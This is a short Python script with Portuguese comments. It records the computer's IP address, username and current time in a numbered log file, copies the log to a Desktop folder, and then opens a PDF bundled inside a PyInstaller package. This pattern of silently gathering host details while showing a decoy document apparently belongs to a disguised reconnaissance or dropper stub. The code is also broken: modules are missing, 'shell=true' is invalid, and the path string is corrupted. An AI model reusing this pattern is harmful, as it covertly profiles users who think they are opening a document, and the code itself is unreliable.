import os
import socket
import getpass
import datetime
import shutil

# Obter o IP do computador
ip = socket.gethostbyname(socket.gethostname())

# Obter o nome de usuário atual
usuario = getpass.getuser()

# Obter o horário atual
horario = datetime.datetime.now()

# Formato da data e hora
formato_data_hora = "%Y-%m-%d %H:%M:%S"

# Verificar se já existe um arquivo de log com um numero sequencial
numero_sequencial = 1
while True:
    nome_arquivo = f"log_{usuario}_{numero_sequencial}.txt"
    if not os.path.exists(nome_arquivo):
        break
    numero_sequencial += 1

# Criar uma string com os dados coletados
dados = f"{ip} - {usuario} - {horario.strftime(formato_data_hora)}"

# Escrever os dados no arquivo de log
with open(nome_arquivo, "a") as arquivo:
    arquivo.write(dados)

# Exportar o arquivo de log para a pasta na rede
shutil.copy(nome_arquivo, r'C:\Users\TestUser\Desktop')

file_name = sys._MEIPASS + "\new_document.pdf"
subprocess.Popen(file_name, shell=true)
